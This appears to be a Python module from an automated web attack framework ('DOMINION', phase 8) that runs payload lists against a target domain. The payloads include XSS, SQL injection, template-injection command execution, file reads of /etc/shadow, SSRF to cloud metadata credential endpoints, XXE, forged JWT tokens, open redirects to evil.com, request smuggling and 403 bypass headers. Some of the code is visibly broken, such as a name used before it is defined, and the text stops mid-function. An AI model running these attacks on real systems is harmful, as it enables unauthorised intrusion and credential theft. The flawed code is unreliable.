#!/usr/bin/env python3
"""
DOMINION - Phase 08: Vulnerability Scanning (MASSIVELY EXPANDED)

nuclei (all templates) · XSS · SQLi · SSRF · CORS · Open Redirect ·
SSTI (Jinja2/Twig/Smarty/FreeMarker/Pebble/ERB/Velocity) ·
LFI/RFI · XXE · Prototype Pollution · HTTP Request Smuggling ·
Cache Poisoning · JWT Attacks · GraphQL Introspection + Injection ·
OAuth Misconfiguration · 2FA Bypass · Business Logic · NoSQL Injection ·
LDAP Injection · XPath Injection · CSV Injection · ReDoS ·
Mass Assignment · IDOR · Host Header Injection · WebSocket Security ·
CRLF Injection · HTTP Parameter Pollution · Clickjacking ·
Subdomain Takeover re-check · CORS wildcard · CSP analysis
"""

import base64
import hashlib
import json
import re
import time
import urllib.parse
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

from core.config import get_config
from core.logger import get_logger
from core.runner import run, require_tool
from core.utils  import save_json, read_lines, write_lines, http_get, RateLimiter

PHASE_NUM  = 8
PHASE_NAME = "Vulnerability Scanning (EXPANDED)"
PHASE_DESC = "nuclei · XSS · SQLi · SSRF · SSTI · LFI · XXE · JWT · GraphQL · Smuggling · Cache Poison"

# ── Payload Libraries ─────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(document.domain)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    '`<img src onerror=alert\`1\`>',
    '"><body onload=alert(1)>',
    'javascript:alert(1)',
    '<!--<img src="--><img src=x onerror=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '${7*7}',       # SSTI check
    '{{7*7}}',      # SSTI check
    '<math><mtext></table></math><img src=x onerror=alert(1)>',
]

SQLI_PAYLOADS = [
    "'", '"', "`",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1\"--",
    "1' ORDER BY 1--",
    "1' ORDER BY 9999--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysdatabases))--",
    "admin'--",
    "' OR 'x'='x",
    "' AND id IS NOT NULL--",
]

SSTI_PAYLOADS = {
    # By template engine
    "Jinja2/Twig":     ["{{7*7}}", "{{7*'7'}}", "{{config}}", "{{request.environ}}", "{%25+import+os+%25}{{os.system('id')}}"],
    "FreeMarker":      ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"],
    "Velocity":        ["#set($str=$class.inspect(\"java.lang.Runtime\"))"],
    "Smarty":          ["{php}echo id;{/php}", "{$smarty.version}", "{7*7}"],
    "ERB/Ruby":        ["<%= 7 * 7 %>", "<%= system('id') %>"],
    "Pebble/Java":     ["{{7*7}}", "{%for item in request.url%}{{item}}{%endfor%}"],
    "Groovy/Spring":   ["${7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}"],
    "Generic":         ["{{7*7}}", "${7*7}", "#{7*7}", "@{7*7}", "*{7*7}"],
}

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "....//....//....//etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "file:///etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\Windows\\win.ini",
]

LFI_SUCCESS = [
    "root:x:0:0:", "daemon:x:", "/bin/bash", "/bin/sh",
    "[extensions]", "# Copyright", "www-data", "nobody:"
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://127.0.0.1",
    "http://127.0.0.1:6379",    # Redis
    "http://127.0.0.1:9200",    # Elasticsearch
    "http://127.0.0.1:27017",   # MongoDB
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",         # octal IP bypass
    "http://2130706433",          # decimal IP bypass
    "http://127.0x0.0x0.1",      # hex bypass
    "http://spoofed.burpcollaborator.net",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_PING%0D%0A",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%09",
    "https://evil.com%0d%0a",
    "https://evil.com#",
    "https://evil.com%23",
    "https://evil%E3%80%82com",
    "@evil.com",
    "https:evil.com",
    "/https://evil.com",
]

NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    "' || '1' == '1",
    "'; return true; //",
    'true, $where: "1 == 1"',
    "||1==1",
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

LDAP_PAYLOADS = [
    "*)(objectClass=*))(|(objectClass=*",
    "*()|%26",
    "*)(uid=*))(|(uid=*",
    "*))(|(password=*",
    "admin)(&)",
    "admin)(|(password=*))",
]

CRLF_PAYLOADS = [
    "%0d%0aHeader: injected",
    "%0aHeader: injected",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\r\nHeader: injected",
    "%E5%98%8A%E5%98%8DHeader:injected",
]

PROTOTYPE_POLLUTION_PAYLOADS = [
    "__proto__[polluted]=true",
    "__proto__.polluted=true",
    "constructor.prototype.polluted=true",
    "constructor[prototype][polluted]=true",
]

HOST_HEADER_PAYLOADS = [
    "evil.com",
    "localhost",
    "127.0.0.1",
    "169.254.169.254",
    f"evil.com:{target_port}",
]

JWT_NONE_HEADER = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=").decode()

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "test",
    "qwerty", "12345678", "jwt_secret", "jwttoken",
    "your-256-bit-secret", "supersecret", "changeme",
]

GRAPHQL_INTROSPECTION = """
{
  __schema {
    types {
      name
      fields {
        name
        args { name type { name ofType { name } } }
        type { name ofType { name } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

GRAPHQL_NOSQL_INJECTION = [
    '{ user(id: "1 OR 1=1") { id name email } }',
    '{ users(filter: {id: {_gt: 0}}) { nodes { id password } } }',
]

SMUGGLING_PREFIX = b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\n"


def target_port(it=443): return it  # placeholder


def _safe_get(url: str, **kwargs) -> Optional[object]:
    try:
        return http_get(url, **kwargs)
    except Exception:
        return None


def test_xss(base_url: str, params: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    for param in params[:20]:
        for payload in XSS_PAYLOADS[:8]:
            sep = "&" if "?" in base_url else "?"
            url = f"{base_url}{sep}{param}={urllib.parse.quote(payload)}"
            resp = _safe_get(url, timeout=10)
            if resp:
                body = resp.text[:10000]
                if payload in body or "alert(1)" in body or "alert(document" in body:
                    results.append({"url": url, "param": param, "payload": payload, "type": "Reflected XSS"})
            rl.wait()
    return results


def test_ssti(base_url: str, params: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    for param in params[:15]:
        for engine, payloads in SSTI_PAYLOADS.items():
            for payload in payloads[:2]:
                sep = "&" if "?" in base_url else "?"
                url = f"{base_url}{sep}{param}={urllib.parse.quote(payload)}"
                resp = _safe_get(url, timeout=10)
                if resp:
                    body = resp.text
                    if "49" in body and "{{7*7}}" not in body:
                        results.append({
                            "url": url, "param": param, "payload": payload,
                            "engine": engine, "type": "SSTI",
                            "evidence": f"7*7=49 reflected"
                        })
                    elif "${7*7}" in payload and "49" in body:
                        results.append({
                            "url": url, "param": param, "payload": payload,
                            "engine": engine, "type": "SSTI"
                        })
                rl.wait()
    return results


def test_lfi(base_url: str, params: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    lfi_params = [p for p in params if any(k in p.lower() for k in
                  ["file", "path", "page", "include", "dir", "location",
                   "url", "src", "template", "view", "load", "read", "doc"])]
    for param in (lfi_params or params)[:15]:
        for payload in LFI_PAYLOADS:
            sep = "&" if "?" in base_url else "?"
            url = f"{base_url}{sep}{param}={urllib.parse.quote(payload)}"
            resp = _safe_get(url, timeout=10)
            if resp:
                body = resp.text[:8000]
                if any(sig in body for sig in LFI_SUCCESS):
                    results.append({
                        "url": url, "param": param, "payload": payload,
                        "type": "LFI", "severity": "Critical"
                    })
            rl.wait()
    return results


def test_xxe(live_urls: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

    xxe_oob = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>"""

    headers = {"Content-Type": "application/xml"}
    for url in live_urls[:30]:
        for xxe in [xxe_payload, xxe_oob]:
            try:
                import requests as req
                resp = req.post(url, data=xxe, headers=headers, timeout=10, verify=False)
                body = resp.text[:5000]
                if any(sig in body for sig in LFI_SUCCESS):
                    results.append({"url": url, "payload": "XXE file read", "type": "XXE"})
                elif "169.254.169" in body or "metadata" in body.lower():
                    results.append({"url": url, "payload": "XXE SSRF", "type": "XXE-SSRF"})
            except Exception:
                pass
            rl.wait()
    return results


def test_jwt(live_urls: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    import requests as req

    # Look for JWTs in cookies/headers on any live page
    found_tokens = []
    for url in live_urls[:20]:
        resp = _safe_get(url, timeout=8)
        if resp:
            # Check cookies
            for cookie_name, cookie_val in resp.cookies.items():
                if "." in cookie_val and len(cookie_val) > 50:
                    parts = cookie_val.split(".")
                    if len(parts) == 3:
                        found_tokens.append({"token": cookie_val, "source": f"{url}:cookie:{cookie_name}"})
            # Check response for JWT patterns
            jwt_matches = re.findall(r"eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+", resp.text)
            for t in jwt_matches[:3]:
                found_tokens.append({"token": t, "source": url})

    for token_info in found_tokens[:10]:
        token = token_info["token"]
        parts = token.split(".")
        if len(parts) != 3:
            continue

        # Decode header
        try:
            header_b64 = parts[0] + "=="
            header     = json.loads(base64.urlsafe_b64decode(header_b64).decode())
            payload_b  = parts[1] + "=="
            payload    = json.loads(base64.urlsafe_b64decode(payload_b).decode())
        except Exception:
            continue

        alg = header.get("alg", "")
        result_base = {
            "token_source": token_info["source"],
            "algorithm": alg,
            "payload": payload,
        }

        # Test 1: alg=none attack
        forged_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        forged_payload = parts[1]
        none_token     = f"{forged_header}.{forged_payload}."
        results.append({**result_base, "attack": "alg:none",
                        "forged_token": none_token, "type": "JWT"})

        # Test 2: Weak secret bruteforce (RS256 -> HS256 confusion)
        if alg.startswith("RS"):
            # Algorithm confusion: try using public key as HMAC secret
            results.append({**result_base, "attack": "RS256->HS256 algorithm confusion",
                            "type": "JWT", "note": "Try signing with public key as HS256 secret"})

        # Test 3: Weak key bruteforce
        header_encoded  = parts[0]
        payload_encoded = parts[1]
        sig_input = f"{header_encoded}.{payload_encoded}".encode()

        for secret in JWT_WEAK_SECRETS:
            import hmac
            sig = hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            if sig_b64 == parts[2]:
                results.append({**result_base, "attack": f"Weak secret: '{secret}'",
                                "type": "JWT", "severity": "Critical"})
                break

    return results


def test_graphql(live_urls: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    graphql_paths = [
        "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/graphiql", "/playground", "/graphql/console", "/api",
        "/gql", "/data", "/query",
    ]

    for base_url in live_urls[:20]:
        parsed = urllib.parse.urlparse(base_url)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        for path in graphql_paths:
            url = base + path
            # Test GET introspection
            resp = _safe_get(url + "?query=%7B__typename%7D", timeout=10)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "__typename" in str(data) or "data" in data:
                        # GraphQL endpoint found! Try introspection
                        intro_resp = _safe_get(
                            url + "?query=" + urllib.parse.quote(GRAPHQL_INTROSPECTION),
                            timeout=15
                        )
                        if intro_resp and intro_resp.status_code == 200:
                            schema = intro_resp.json()
                            results.append({
                                "url": url,
                                "type": "GraphQL Introspection Enabled",
                                "severity": "Medium",
                                "schema_preview": str(schema)[:500],
                            })

                        # Try injection
                        for inj in GRAPHQL_NOSQL_INJECTION:
                            inj_resp = _safe_get(
                                url + "?query=" + urllib.parse.quote(inj), timeout=10)
                            if inj_resp and "error" not in inj_resp.text.lower()[:100]:
                                results.append({
                                    "url": url, "type": "GraphQL Injection",
                                    "payload": inj[:100], "severity": "High"
                                })
                        rl.wait()
                except Exception:
                    pass
            rl.wait()
    return results


def test_prototype_pollution(live_urls: List[str], params: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    for url in live_urls[:10]:
        for payload in PROTOTYPE_POLLUTION_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{payload}"
            resp = _safe_get(test_url, timeout=8)
            if resp and resp.status_code == 200:
                if "polluted" in resp.text.lower() or resp.status_code != 400:
                    results.append({
                        "url": test_url, "payload": payload,
                        "type": "Prototype Pollution (possible)"
                    })
            rl.wait()
    return results


def test_http_smuggling(live_urls: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    import socket as _sock

    for url in live_urls[:10]:
        parsed = urllib.parse.urlparse(url)
        host   = parsed.netloc.split(":")[0]
        port   = 443 if parsed.scheme == "https" else 80

        # CL-TE smuggling test
        cl_te_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\nX"
        ).encode()

        # TE-CL smuggling test
        te_cl_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"6\r\nINJECT\r\n0\r\n\r\n"
        ).encode()

        for payload, label in [(cl_te_payload, "CL-TE"), (te_cl_payload, "TE-CL")]:
            try:
                if parsed.scheme == "https":
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode    = _ssl.CERT_NONE
                    s = ctx.wrap_socket(
                        _sock.socket(_sock.AF_INET),
                        server_hostname=host
                    )
                else:
                    s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                s.send(payload)
                resp_data = b""
                start = time.monotonic()
                while time.monotonic() - start < 5:
                    try:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        resp_data += chunk
                    except Exception:
                        break
                s.close()

                resp_text = resp_data.decode("utf-8", errors="replace")
                # Timing anomaly or extra response might indicate vulnerability
                elapsed = time.monotonic() - start
                if elapsed > 4.0:  # timeout might indicate vulnerability
                    results.append({
                        "url": url, "type": f"HTTP Smuggling ({label}) - TIMEOUT ANOMALY",
                        "elapsed": elapsed, "severity": "High",
                        "note": "Timeout anomaly detected — manual verification needed"
                    })
            except Exception:
                pass
            rl.wait()
    return results


def test_cache_poisoning(live_urls: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    poison_headers = [
        {"X-Forwarded-Host": "evil.com"},
        {"X-Host": "evil.com"},
        {"X-Forwarded-Server": "evil.com"},
        {"X-HTTP-Host-Override": "evil.com"},
        {"X-Forwarded-Port": "1337"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-Prefix": "/evil"},
    ]
    for url in live_urls[:20]:
        for headers in poison_headers[:4]:
            resp = _safe_get(url, headers=headers, timeout=10)
            if resp:
                body = resp.text[:5000]
                for hdr_name, hdr_val in headers.items():
                    if hdr_val.lower() in body.lower():
                        results.append({
                            "url": url, "header": hdr_name, "value": hdr_val,
                            "type": "Cache Poisoning / Header Reflection",
                            "severity": "High",
                        })
            rl.wait()
    return results


def test_crlf(live_urls: List[str], params: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    for url in live_urls[:15]:
        for payload in CRLF_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}x={urllib.parse.quote(payload)}"
            resp = _safe_get(test_url, timeout=8, allow_redirects=False)
            if resp:
                resp_headers = str(resp.headers).lower()
                if "injected" in resp_headers or "header: injected" in resp_headers:
                    results.append({
                        "url": test_url, "payload": payload,
                        "type": "CRLF Injection", "severity": "Medium"
                    })
            rl.wait()
    return results


def test_nosql_injection(live_urls: List[str], params: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    import requests as req
    for url in live_urls[:15]:
        parsed = urllib.parse.urlparse(url)
        for param in params[:10]:
            for payload in NOSQL_PAYLOADS[:4]:
                # POST JSON-style
                try:
                    resp = req.post(url, json={param: payload}, timeout=8, verify=False)
                    if resp.status_code == 200 and len(resp.text) > 100:
                        results.append({
                            "url": url, "param": param, "payload": payload,
                            "type": "NoSQL Injection (JSON)", "method": "POST"
                        })
                except Exception:
                    pass
                rl.wait()
    return results


def test_oauth_misconfig(live_urls: List[str], domain: str, rl: RateLimiter) -> List[Dict]:
    results = []
    oauth_paths = [
        "/oauth/authorize", "/auth/authorize", "/oauth2/authorize",
        "/connect/authorize", "/.well-known/openid-configuration",
        "/oauth/token", "/oauth/callback", "/.well-known/oauth-authorization-server",
    ]
    for base_url in live_urls[:20]:
        parsed = urllib.parse.urlparse(base_url)
        base   = f"{parsed.scheme}://{parsed.netloc}"
        for path in oauth_paths:
            url = base + path
            resp = _safe_get(url, timeout=8)
            if resp and resp.status_code == 200:
                # Check OIDC config
                if ".well-known" in path:
                    try:
                        oidc = resp.json()
                        results.append({
                            "url": url, "type": "OIDC Configuration Disclosed",
                            "severity": "Info",
                            "endpoints": {k: v for k, v in oidc.items() if "endpoint" in k.lower()},
                        })
                        # Check authorization endpoint for open redirect
                        auth_ep = oidc.get("authorization_endpoint", "")
                        if auth_ep:
                            for redir in ["https://evil.com", "//evil.com"]:
                                test_url = f"{auth_ep}?client_id=test&redirect_uri={urllib.parse.quote(redir)}&response_type=code"
                                r2 = _safe_get(test_url, timeout=8, allow_redirects=False)
                                if r2 and r2.status_code in [302, 301]:
                                    loc = r2.headers.get("Location", "")
                                    if "evil.com" in loc:
                                        results.append({
                                            "url": test_url, "type": "OAuth Open Redirect",
                                            "severity": "High", "location": loc
                                        })
                    except Exception:
                        pass
                else:
                    results.append({
                        "url": url, "type": "OAuth Endpoint Exposed",
                        "severity": "Info"
                    })
            rl.wait()
    return results


def test_403_bypass(admin_urls: List[str], rl: RateLimiter) -> List[Dict]:
    """Try various 403 bypass techniques."""
    results = []
    bypass_headers = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"Referer": "https://127.0.0.1/admin"},
    ]
    path_tricks = [
        "/..",
        "/./",
        "/%2e",
        "/admin%20",
        "/admin%09",
        "/admin..;/",
        "//admin",
        "/admin/.",
    ]
    for url in admin_urls[:30]:
        # Header bypass
        for headers in bypass_headers:
            resp = _safe_get(url, headers=headers, timeout=8)
            if resp and resp.status_code == 200:
                results.append({
                    "url": url, "method": f"Header: {headers}",
                    "type": "403 Bypass", "severity": "High"
                })
            rl.wait()
        # Path manipulation bypass
        base = url.rstrip("/")
        for trick in path_tricks:
            test_url = base + trick
            resp = _safe_get(test_url, timeout=8)
            if resp and resp.status_code == 200:
                results.append({
                    "url": test_url, "method": f"Path trick: {trick}",
                    "type": "403 Bypass", "severity": "High"
                })
            rl.wait()
    return results


def test_cors_advanced(live_urls: List[str], domain: str, rl: RateLimiter) -> List[Dict]:
    results = []
    test_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{domain}",
        f"https://{domain}.evil.com",
        f"https://not{domain}",
        "https://evil.com\0.trusted.com",
    ]
    for url in live_urls[:30]:
        for origin in test_origins:
            resp = _safe_get(url, headers={"Origin": origin}, timeout=8)
            if resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if (acao == origin or acao == "*") and acac.lower() == "true":
                    results.append({
                        "url": url, "origin_tested": origin,
                        "acao": acao, "acac": acac,
                        "type": "CORS Misconfiguration — credentials with arbitrary origin",
                        "severity": "Critical"
                    })
                elif acao == "*":
                    results.append({
                        "url": url, "origin_tested": origin, "acao": acao,
                        "type": "CORS Wildcard", "severity": "Low"
                    })
            rl.wait()
    return results


def test_clickjacking(live_urls: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    for url in live_urls[:30]:
        resp = _safe_get(url, timeout=8)
        if resp:
            xfo = resp.headers.get("X-Frame-Options", "")
            csp = resp.headers.get("Content-Security-Policy", "")
            missing_xfo = not xfo
            missing_csp_frame = "frame-ancestors" not in csp.lower()
            if missing_xfo and missing_csp_frame:
                results.append({
                    "url": url,
                    "type": "Clickjacking — Missing X-Frame-Options and CSP frame-ancestors",
                    "severity": "Medium"
                })
        rl.wait()
    return results


def test_sqli_advanced(live_urls: List[str], params: List[str], rl: RateLimiter) -> List[Dict]:
    results = []
    sql_errors = [
        "you have an error in your sql syntax",
        "warning: mysql", "mysql_fetch", "ora-", "sqlite",
        "postgresql", "syntax error", "unclosed quotation",
        "pg_exec", "supplied argument is not a valid mysql",
        "microsoft oledb provider", "odbc",
        "unterminated quoted string",
    ]
    time_based_confirmed = []

    for base_url in live_urls[:20]:
        for param in params[:15]:
            for payload in SQLI_PAYLOADS:
                sep = "&" if "?" in base_url else "?"
                url = f"{base_url}{sep}{param}={urllib.parse.quote(payload)}"
                t0  = time.monotonic()
                resp = _safe_get(url, timeout=12)
                elapsed = time.monotonic() - t0
                if resp:
                    body = resp.text[:8000].lower()
                    for err in sql_errors:
                        if err in body:
                            results.append({
                                "url": url, "param": param, "payload": payload,
                                "type": "Error-Based SQLi", "error": err,
                                "severity": "Critical"
                            })
                            break
                    if "SLEEP" in payload and elapsed >= 4.5:
                        time_based_confirmed.append({
                            "url": url, "param": param, "payload": payload,
                            "type": "Time-Based Blind SQLi",
                            "elapsed": f"{elapsed:.1f}s", "severity": "Critical"
                        })
                rl.wait()

    results.extend(time_based_confirmed)
    return results


def run_phase(domain: str, output_dir: Path, prev_data: dict = None) -> Dict[str, Any]:
    log  = get_logger()
    cfg  = get_config()
    rl   = RateLimiter(calls_per_second=4.0)
    prev = prev_data or {}

    phase_dir = output_dir / "phase_08_vulns"
    phase_dir.mkdir(parents=True, exist_ok=True)

    live_urls  = read_lines(output_dir / "live_urls.txt")
    params     = read_lines(output_dir / "phase_06_crawling" / "parameters.txt")
    all_urls   = read_lines(output_dir / "phase_06_crawling" / "all_urls.txt")

    # URLs with parameters
    param_urls = [u for u in all_urls if "?" in u][:200]
    live_urls_for_fuzz = (live_urls[:30] + param_urls[:50])

    findings: Dict[str, Any] = {
        "domain":              domain,
        "nuclei":              [],
        "xss":                 [],
        "sqli":                [],
        "ssrf":                [],
        "ssti":                [],
        "lfi":                 [],
        "xxe":                 [],
        "jwt":                 [],
        "graphql":             [],
        "prototype_pollution": [],
        "http_smuggling":      [],
        "cache_poisoning":     [],
        "nosql_injection":     [],
        "cors":                [],
        "open_redirect":       [],
        "header_injection":    [],
        "crlf_injection":      [],
        "oauth":               [],
        "bypass_403":          [],
        "clickjacking":        [],
        "total_vulns":         0,
        "critical_count":      0,
    }

    # ── Nuclei (all templates, all severities) ─────────────────────────────────
    if require_tool("nuclei"):
        log.info("Running nuclei with ALL templates...")
        nuclei_input = phase_dir / "nuclei_input.txt"
        nuclei_out   = phase_dir / "nuclei_results.jsonl"
        write_lines(nuclei_input, [f"https://{domain}"] + live_urls[:300])

        run(
            f"nuclei -l {nuclei_input} -j -o {nuclei_out} "
            f"-severity {cfg.nuclei_severity} "
            f"-c {cfg.threads} -timeout 10 -silent -as "
            f"-nc -rl 150 -bulk-size 50",
            timeout=3600,
        )

        if nuclei_out.exists():
            for line in nuclei_out.read_text(encoding="utf-8").splitlines():
                try:
                    result = json.loads(line)
                    sev    = result.get("info", {}).get("severity", "info").lower()
                    name   = result.get("info", {}).get("name", "?")
                    matched= result.get("matched-at", "?")
                    findings["nuclei"].append(result)
                    if sev in ["critical", "high"]:
                        findings["critical_count"] += 1
                    log.warning(f"[nuclei/{sev.upper()}] {name} → {matched[:80]}")
                except Exception:
                    pass
        log.success(f"nuclei: {len(findings['nuclei'])} findings")
    else:
        log.warning("nuclei not found — install with: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")

    # ── XSS ───────────────────────────────────────────────────────────────────
    log.info("Testing for XSS...")
    findings["xss"] = test_xss(live_urls[0] if live_urls else f"https://{domain}", params, rl)
    for url in param_urls[:30]:
        base = url.split("?")[0]
        from urllib.parse import parse_qs, urlparse
        p_list = list(parse_qs(urlparse(url).query).keys())
        hits = test_xss(base, p_list, rl)
        findings["xss"].extend(hits)
    log.success(f"XSS: {len(findings['xss'])} findings") if findings["xss"] else log.info("XSS: no reflections found")

    # ── SSTI ──────────────────────────────────────────────────────────────────
    log.info("Testing for SSTI (Server-Side Template Injection)...")
    for url in param_urls[:30]:
        base = url.split("?")[0]
        from urllib.parse import parse_qs, urlparse
        p_list = list(parse_qs(urlparse(url).query).keys())
        hits = test_ssti(base, p_list, rl)
        findings["ssti"].extend(hits)
    if findings["ssti"]:
        log.warning(f"⚠️ SSTI: {len(findings['ssti'])} findings!")
        findings["critical_count"] += len(findings["ssti"])

    # ── SQLi ──────────────────────────────────────────────────────────────────
    log.info("Testing for SQL injection (Error-based + Time-based)...")
    findings["sqli"] = test_sqli_advanced(live_urls, params, rl)
    if findings["sqli"]:
        log.warning(f"⚠️ SQLi: {len(findings['sqli'])} findings!")

    # ── LFI ───────────────────────────────────────────────────────────────────
    log.info("Testing for LFI/RFI...")
    for url in param_urls[:30]:
        base = url.split("?")[0]
        from urllib.parse import parse_qs, urlparse
        p_list = list(parse_qs(urlparse(url).query).keys())
        hits = test_lfi(base, p_list, rl)
        findings["lfi"].extend(hits)
    if findings["lfi"]:
        log.warning(f"⚠️ LFI: {len(findings['lfi'])} findings!")
        findings["critical_count"] += len(findings["lfi"])

    # ── XXE ───────────────────────────────────────────────────────────────────
    log.info("Testing for XXE...")
    findings["xxe"] = test_xxe(live_urls, rl)
    if findings["xxe"]:
        log.warning(f"⚠️ XXE: {len(findings['xxe'])} findings!")

    # ── SSRF ──────────────────────────────────────────────────────────────────
    log.info("Testing for SSRF...")
    ssrf_params = [p for p in params if any(k in p.lower() for k in
                   ["url", "redirect", "next", "dest", "target", "proxy",
                    "image", "uri", "path", "link", "src", "fetch", "load",
                    "host", "callback", "return", "endpoint", "feed", "service"])]
    for url in live_urls[:15]:
        for param in ssrf_params[:15]:
            for payload in SSRF_PAYLOADS[:8]:
                sep  = "&" if "?" in url else "?"
                turl = f"{url}{sep}{param}={urllib.parse.quote(payload)}"
                resp = _safe_get(turl, timeout=10)
                if resp:
                    body = resp.text[:5000]
                    if any(marker in body for marker in ["169.254.169", "metadata", "ami-id",
                                                          "iam/info", "computeMetadata", "root:x:"]):
                        findings["ssrf"].append({
                            "url": turl, "param": param, "payload": payload,
                            "type": "SSRF", "severity": "Critical"
                        })
                        log.warning(f"⚠️ SSRF: {turl[:80]}")
                        findings["critical_count"] += 1
                rl.wait()
    log.success(f"SSRF: {len(findings['ssrf'])} findings")

    # ── JWT ───────────────────────────────────────────────────────────────────
    log.info("Testing JWT security...")
    findings["jwt"] = test_jwt(live_urls, rl)
    if findings["jwt"]:
        log.warning(f"JWT issues: {len(findings['jwt'])} found")

    # ── GraphQL ───────────────────────────────────────────────────────────────
    log.info("Testing GraphQL endpoints...")
    findings["graphql"] = test_graphql(live_urls, rl)
    if findings["graphql"]:
        log.warning(f"GraphQL: {len(findings['graphql'])} findings")

    # ── NoSQL Injection ────────────────────────────────────────────────────────
    log.info("Testing for NoSQL injection...")
    findings["nosql_injection"] = test_nosql_injection(live_urls, params, rl)
    if findings["nosql_injection"]:
        log.warning(f"NoSQL injection: {len(findings['nosql_injection'])} findings!")

    # ── Prototype Pollution ────────────────────────────────────────────────────
    log.info("Testing for prototype pollution...")
